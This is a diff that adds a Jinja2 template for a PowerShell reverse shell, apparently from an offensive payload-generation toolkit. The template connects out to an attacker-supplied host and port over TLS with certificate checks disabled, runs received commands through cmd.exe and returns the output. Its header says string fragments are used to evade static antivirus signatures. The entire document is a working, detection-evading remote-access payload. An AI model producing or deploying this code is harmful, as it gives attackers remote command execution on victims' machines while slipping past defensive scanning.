@@ -1,0 +1,21 @@
+{# templates/shells/powershell_tls_reverse.j2
+   TLS-wrapped reverse shell via SslStream.
+   String fragments prevent static 'TCPClient' / 'SslStream' signature hits.
+   Variables: lhost (str), lport (int)
+#}
+$h='{{ lhost }}';$p={{ lport }};
+$a='System';$b='.Net.Sock';$c='ets.TCP'+'Client';
+$t=[System.Type]::GetType($a+$b+$c);
+$cl=$t::new($h,$p);
+$ns=$cl.GetStream();
+$ss=New-Object System.Net.Security.SslStream($ns,$false,{$true});
+$ss.AuthenticateAsClient($h);
+[byte[]]$by=0..65535|%{0};
+while(($i=$ss.Read($by,0,$by.Length)) -ne 0){
+  $d=(New-Object System.Text.ASCIIEncoding).GetString($by,0,$i);
+  $r=([System.Diagnostics.Process]::Start(
+    [string]::Join('',@('cm','d.e','xe')),"/c $d"
+  )|Out-String);
+  $e=[System.Text.Encoding]::ASCII.GetBytes($r);
+  $ss.Write($e,0,$e.Length)
+}
